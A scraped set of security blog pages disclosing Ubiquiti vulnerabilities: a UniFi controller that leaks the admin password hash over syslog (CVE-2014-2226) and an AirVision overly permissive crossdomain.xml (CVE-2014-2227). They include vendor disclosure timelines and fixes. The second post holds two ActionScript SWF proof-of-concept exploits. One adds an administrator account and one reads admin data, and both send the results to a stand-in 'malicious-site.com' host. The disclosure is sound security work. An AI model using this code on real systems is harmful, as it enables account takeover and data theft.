* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from sethsec.blogspot.com_7de0d149_20250126_104325.html ===

[Skip to main content](#main)

### Search This Blog

# [SethSec](https://sethsec.blogspot.com/)

### CVE-2014-2226

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html "permanent link")

Ubiquiti - UniFi Controller - Admin/root password hash sent via syslog

CWE-310: <http://cwe.mitre.org/data/definitions/310.html>

**Misuse case:**

An attacker who has access to network traffic between the UniFi controller and the configured syslog server, can retrieve the password hash and use it to access all managed access points, and potentially the UniFi controller as well.

**Details:**

If remote logging is enabled on the UniFi controller, the controller sends syslog messages to the configured syslog server. Contained within the syslog messages is the admin password hash that is used by both the UniFi controller, and all managed Access Points.

In the screenshot below, the auth key and the encrypted password are highlighted in yellow.

![](https://lh4.googleusercontent.com/0mbDkx7JP6QtDKphoCV8GUyOmvXsF727etC4W-ONes_XLUwRgOZ8z4TwYAdFUYAmWgJkgSe19uzavb6aoa2GlB-nv0iQHb4zFMjvUTd-G4iDQEVlxvxXenQyEvzC6TSnHZAXp3NgHl4)

The password is encrypted using the legacy crypt(1) utility, which uses Traditional DES [128/128 BS SSE2], and can be recovered using John the Ripper:

![](https://lh6.googleusercontent.com/F0H0WOrZ_DRZNbIT1kvkYDCSoAxG5T2WX0a1YFcXh8DVb3lOnIuAhtY9D-wZf0jBGjp5gMC5cpJf96IW6Fs2Bhg8fnWXaf8DlU0Gkd9zBRWjg1kxeoK09ngpRjKBX5UlFci68KmBmos)
Note: The salt (and hash) changes each time the message is sent, but the password can always be recovered.

Once you crack the password, you can log into any of the managed access points via SSH. This is actually the format of the password that is used by BusyBox:

![](https://lh3.googleusercontent.com/1c5ZYUnNthS6UuX9kVTKh8WU-SSss6SjT8sJ5ZQiLDMHUXxDxkBv5t9fMr86n-cjGWOfzR8pQiRt8dlsA6VMBEo6acsMSVZICZlT-S5i99ed41raNUqYgOLXh_znLJW2Nx0tlh8Gnms)

The CVE was assigned as there is no utility (reason) for sending the admin password via syslog messages.

Additional details:

(CVE-2014-2226) - Ubiquiti Networks - UniFi Controller - Admin/root password hash sent via syslog

-----------
Vendor:
-----------
Ubiquiti Networks (http://www.ubnt.com/)

----------------------------------------------
Affected Products/Versions:
----------------------------------------------
UniFi Controller v2.4.6
Note: Previous versions may be affected

-----------------
Description:
-----------------
Title: Admin/Root password hash sent in syslog messages
CVE: CVE-2014-2226
CWE: CWE-319: http://cwe.mitre.org/data/definitions/319.html
Researcher: Seth Art - @sethsec
Detailed writeup (includes screenshots): <http://sethsec.blogspot.com/2014/07/cve-2014-2226.html>

If remote logging is enabled on the UniFi controller, syslog messages are sent to a syslog server.  Contained within the syslog messages is the admin password that is used by both the UniFi controller, and all managed Access Points.  This CVE was assigned as there is no utility for sending the admin password hash via syslog messages.

------
POC:
------
Not Applicable.

-------------
Solution:
-------------
UniFi Controller - Upgrade to UniFi Controller v3.2.1 or greater

-----------------------------
Disclosure Timeline:
-----------------------------
2014-02-16: Notified Ubiquiti of vulnerabilities in UniFi and mFi products
2014-02-17: Ubiquiti acknowledges and requests details
2014-02-17: Report with POC sent to Ubiquiti
2014-02-19: Asks Ubiquiti to confirm receipt of report
2014-02-19: Ubiquti confirms receipt of report and existence of the vulnerabilities
2014-02-28: CVE-2014-2226 assigned
2014-03-12: Requested status update
2014-03-27: Requested status update
2014-04-07: Requested status update
2014-04-09: Ubiquiti provides timeline for solution
2014-05-30: Requested status update
2014-06-12: Requested status update
2014-06-12: UniFi 3.2.1 is released
2014-06-13: Set public disclosure date of 2014-07-24
2014-07-24: Public disclosure

[exploit](https://sethsec.blogspot.com/search/label/exploit)
[Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
[vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
[Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Comments

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/7006622851642190540)

### Popular posts from this blog

### [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

-

[November 09, 2016](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDAdiXxWBRlKa-3IX5mSeTJf_o9RZLPM2ULZeDXPLVbz1_LxpI5igNEamWrUhAO7mn50sJsKxxnf2DZZm3Z-J60Hgzl4FzcxwTywyGJpFefNSaW9e7ypaOw9qvZtibb0sX-SsBZ1CJxAQU/s640/pyinject-vulncode1.png)](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

[Read more](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html "Exploiting Python Code Injection in Web Applications")

### [Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

-

[December 23, 2015](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg04AN5MQr8g6sku-o5iqkrleECjtexRb_UJkpSTc12UhZ4NTNcEKgLoT8-rlnoQ1BrEK8C-3_d70d3JeCNeq3DyvAE2CyWHMjgKODXS3H3mNtRhtlsbD2V6OEQlY2O0aYzrx2tsl_10bvo/s400/burp-collaborator1.png)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

[Read more](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html "Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)")

### [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "permanent link")

[![Image](https://lh4.googleusercontent.com/jUQ5YRvJRPdgEedzXqoF_zaEne2nXRH3Ul9KKiFAIh8rZu0xcPdE7Gb-n7_869b6UMOgrxaWxncd0CHR8od0Vwk-LNA6u62W_jtQ1lBXMGzAFWV4ggZEuDrM7-A_z6fNfulA2q66Rrs)](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

This CVE covers three separate Ubiquiti Networks applications that are all vulnerable to CSRF: UniFi Controller mFi Controller AirVision Controller Ubiquiti - UniFi Controller v2.4.6 - Cross-site Request Forgery (CSRF) CWE-352: http://cwe.mitre.org/data/definitions/352.html The UniFi application is vulnerable to CSRF in multiple locations.  The CWE link above has a great summary of the vulnerability.  In the POC below, I demonstrate how an unauthenticated attacker can send a malicious hyperlink to an authenticated administrator, and how if the administrator clicks on the link, the attacker can force the authenticated administrator to perform quite a few actions without knowing it.  The most serious POC involves the attacker causing the administrator to create a second administrator account.  The attacker can now log into the Unifi controller with this second account (if they have network access to the Unifi controller), and perform any actions that a...

[Read more](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "CVE-2014-2225")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)

    - [CVE-2014-2227](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html)
    - [CVE-2014-2226](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html)
    - [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)
    - [Real world exploitation of a misconfigured crossdo...](https://sethsec.blogspot.com/2014/07/crossdomain-bing.html)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from sethsec.blogspot.com_60077f79_20250125_174739.html ===

[Skip to main content](#main)

### Search This Blog

# [SethSec](https://sethsec.blogspot.com/)

### CVE-2014-2227

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html "permanent link")

This CVE covers a vulnerability found in the Ubiquiti Networks AirVision application.  For more background on this particular vulnerability, check out this post:

[Exploiting misconfigured crossdomain.xml files](http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html)

In fact, I wrote that first crossdomain.xml blog post after finding this AirVision vulnerability back in February.  If you already read that post, you should recognize the vulnerable form I use for the POC here (adding an administrator), is the same one I used earlier.

Here is a cleaned up version of what I sent to Ubiquiti back in February:

# AirVision Controller v2.1.3 - Overly Permissive default crossdomain.xml

CWE-264: <http://cwe.mitre.org/data/definitions/264.html>

**Misuse Case**

If the victim user is authenticated with their AirVision Controller, and they visit a malicious site, the owner of the malicious site can make changes to, and read data from, the AirVision Controller. The malicious site can even add a new administrative user account.

Vulnerable default configuration:

![](https://lh3.googleusercontent.com/L9EZPENjUAo8DKZCtd4x3_IwEO6xcBb2k-NaebevoLACzHy8s88Pu3IWrSkHFVhfiemS4Wzuv7eKc5cdCO26Vij3Z0zb6JBIsFFMWcXCjpf1YZFkq-1Vl-k7K_mxYH3j02o2km1tgqc)

POC:

**Step 1:** Attacker hosts the malicious SWF on his/her server, and socially engineers a victim AirVision administrator who is currently logged in, to view the SWF file

**Step 2:** The victim, while logged into AirVision, views the SWF file on the attackers server:

![](https://lh3.googleusercontent.com/NnrdzwtTW_9EVFHqsa5-PiA3Bsjo9Ypg50jaamO5Ddewjp43uZjTuj_IAtVGsEO_yuwsuM91fffIUbJJ2Qe058Emqlq3a_nACg2UWjKLX_EhQW0Xi964JziC3nssz4hz7RcTPnhHxXg)

![](https://lh5.googleusercontent.com/uPnlSMK7_8UxoaQ8AsudJuQEZ1CMMp89n8rnkCnYtLeMyuRfe9XGe_TF4f3jF5C8G-2PNZ0EHcmuV6PK_e2xaG1cTk7aizJ_LI6YpFt3IvjFpT8vXN1iuFr29V-6tSwti3IJedc8sKA)

**Step 3:** The SWF loads on the victims machine, and makes a request on behalf of the victim (exploiting CSRF to add an administrator):

![](https://lh3.googleusercontent.com/E6Fe7o3CbQj2wqiW-FFlkX3d26wxcuTJspKmuAovCRpPjJVychkxQ3F9VUQITPfDaKXK4c-ORKbuA8ko2KH6nwTuNdJN1D2_GdryRVJy0L33BbKlxtV5IDe7xqapaPlzNiDyNwYmow8)

Response:
![](https://lh5.googleusercontent.com/dL-Pf78AVMYAO_tBPpg1_7luXYgeRR9bnPibZ6WtTNXLjX_ZLxBTDo20fBrE9gaXyN7ScwMXG69w4mnnzzT84Zc_GDBmdEaYIjK7wJWH-Y4dYn5wSwkm_vZ1aiqaYk2G0iVKaoiRQrs)

**Step 4:** The SWF is able to bypass Same-Origin-Policy because of the overly permissive crossdomain.xml file, and it records the server response to the previous request, and sends that to the attacker:
![](https://lh4.googleusercontent.com/xN9QwKK3gJa5vAbatv9IjCdc300vI41Bw93qJkM7bDg37ISH9gWM4xlcizpUABNmvcYPCsLsHiKJPGLrAx7uq3SZhT0MvcAnWzCxk164AT-paLUzTqepe05IMxf-8y--Cl9OOb1AvLE)

The server receives the information and responds with a HTTP 200 OK.
![](https://lh5.googleusercontent.com/FyOVInWVphGVZIEueiRCuDvUd5A-ew1ZrFSGiX_EGiQVokAyUVQnI30LXrTNi1CvlpK0lZNdlxuMKiO33B-LSJcpnGaeBNAq3fYUfKPjR9QoR1eyxbKUEIpJdhCxvCn_i7An5TLA6iM)
Here is another example of how an attacker could exploit this vulnerability, that is much different than what CSRF can do. In the screenshot below, the SWF makes a request to /api/2.0/log?type=error.  The SWF then reads the data that comes back from that request and sends it to the attacker’s server, where the attacker consumes the raw data.

![](https://lh3.googleusercontent.com/ZQujzD6NAslweprDVE2HGoerJaO6QuIUWCYnv-lgyUvuC2wWfA3ECSV-_kuQhLChGqqlLFtYZNxPXteDOoVkT9FGSb8Eq9gXsK3qxFV8HIhtJfG5wlvp3lZwjxqdM0muvwGNCXEK6q0)

Additional details:

(CVE-2014-2227) - Ubiquiti Networks - AirVision v2.1.3 - Overly Permissive default crossdomain.xml

-----------
Vendor:
-----------
Ubiquiti Networks (http://www.ubnt.com/)

----------------------------------------------
Affected Products/Versions:
----------------------------------------------
AirVision Controller v2.1.3
Note: Previous versions may be affected

-----------------
Description:
-----------------
Title: Overly Permissive default crossdomain.xml file
CVE: CVE-2014-2227
CWE: CWE-264: <http://cwe.mitre.org/data/definitions/264.html>
Researcher: Seth Art - @sethsec
Detailed writeup (includes screenshots): <http://sethsec.blogspot.com/2014/07/cve-2014-2227.html>

------------------------------------------------------------------------------------------------------
POC #1: Using crossdomain.xml to execute CSRF and add an  administrator:
------------------------------------------------------------------------------------------------------

// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github: (<https://github.com/gursev/flash-xdomain-xploit>)
package {
 import flash.display.Sprite;
 import flash.events.\*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;
 import flash.net.URLRequestHeader;

 public class XDomainXploit3 extends Sprite {
  public function XDomainXploit3() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "https//victim:7443/api/2.0/admin";
   var header:URLRequestHeader = new URLRequestHeader("Content-Type",
"text/plain; charset=UTF-8");
   var readRequest:URLRequest = new URLRequest(readFrom);
   readRequest.method = URLRequestMethod.POST
   readRequest.data =
"{\"name\":\"csrf-cdp\",\"email\":\"csrf-cdp@gmail.com\",\"userGroup\":\"admin\",\"x\_password\":\"password\",\"confirmPassword\":\"password\",\"disabled\":false}";
   readRequest.requestHeaders.push(header);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }

  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "<http://www.malicious-site.com/crossdomain/store.php>"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

-----------------------------------------------------------------------
POC #2: Using crossdomain.xml to exfiltrate log data:
-----------------------------------------------------------------------

// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github: (<https://github.com/gursev/flash-xdomain-xploit>)
package {
 import flash.display.Sprite;
 import flash.events.\*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class XDomainXploit extends Sprite {
  public function XDomainXploit() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "/victim:7443/api/2.0/admin";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }

  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "<http://www.malicious-site.com/admin>"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

-------------
Solution:
-------------
AirVision Controller - Upgrade to UniFi Video v3.0.1 or greater (Note: The application name changed from AirVision to UniFi Video)

-----------------------------
Disclosure Timeline:
-----------------------------

2014-02-25: Notified Ubiquiti of crossdomain vulnerability in AirVision product
2014-02-19: Ubiquti confirms receipt of AirVision report and existence of the vulnerability
2014-02-28: CVE-2014-2227 assigned
2014-03-12: Requested status update
2014-03-27: Requested status update
2014-04-07: Requested status update
2014-04-09: Ubiquiti provides timeline for solution
2014-04-18: UniFi Video 3.0.1 is released
2014-06-13: Set public disclosure date of 2014-07-24
2014-07-24: Public disclosure

[crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
[CSRF](https://sethsec.blogspot.com/search/label/CSRF)
[exploit](https://sethsec.blogspot.com/search/label/exploit)
[Flash](https://sethsec.blogspot.com/search/label/Flash)
[SWF](https://sethsec.blogspot.com/search/label/SWF)
[Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
[vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
[Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Comments

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/2467150705887262503)

### Popular posts from this blog

### [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

-

[November 09, 2016](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDAdiXxWBRlKa-3IX5mSeTJf_o9RZLPM2ULZeDXPLVbz1_LxpI5igNEamWrUhAO7mn50sJsKxxnf2DZZm3Z-J60Hgzl4FzcxwTywyGJpFefNSaW9e7ypaOw9qvZtibb0sX-SsBZ1CJxAQU/s640/pyinject-vulncode1.png)](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

[Read more](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html "Exploiting Python Code Injection in Web Applications")

### [Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

-

[December 23, 2015](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg04AN5MQr8g6sku-o5iqkrleECjtexRb_UJkpSTc12UhZ4NTNcEKgLoT8-rlnoQ1BrEK8C-3_d70d3JeCNeq3DyvAE2CyWHMjgKODXS3H3mNtRhtlsbD2V6OEQlY2O0aYzrx2tsl_10bvo/s400/burp-collaborator1.png)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

[Read more](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html "Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)")

### [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "permanent link")

[![Image](https://lh4.googleusercontent.com/jUQ5YRvJRPdgEedzXqoF_zaEne2nXRH3Ul9KKiFAIh8rZu0xcPdE7Gb-n7_869b6UMOgrxaWxncd0CHR8od0Vwk-LNA6u62W_jtQ1lBXMGzAFWV4ggZEuDrM7-A_z6fNfulA2q66Rrs)](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

This CVE covers three separate Ubiquiti Networks applications that are all vulnerable to CSRF: UniFi Controller mFi Controller AirVision Controller Ubiquiti - UniFi Controller v2.4.6 - Cross-site Request Forgery (CSRF) CWE-352: http://cwe.mitre.org/data/definitions/352.html The UniFi application is vulnerable to CSRF in multiple locations.  The CWE link above has a great summary of the vulnerability.  In the POC below, I demonstrate how an unauthenticated attacker can send a malicious hyperlink to an authenticated administrator, and how if the administrator clicks on the link, the attacker can force the authenticated administrator to perform quite a few actions without knowing it.  The most serious POC involves the attacker causing the administrator to create a second administrator account.  The attacker can now log into the Unifi controller with this second account (if they have network access to the Unifi controller), and perform any actions that a...

[Read more](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "CVE-2014-2225")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)

    - [CVE-2014-2227](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html)
    - [CVE-2014-2226](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html)
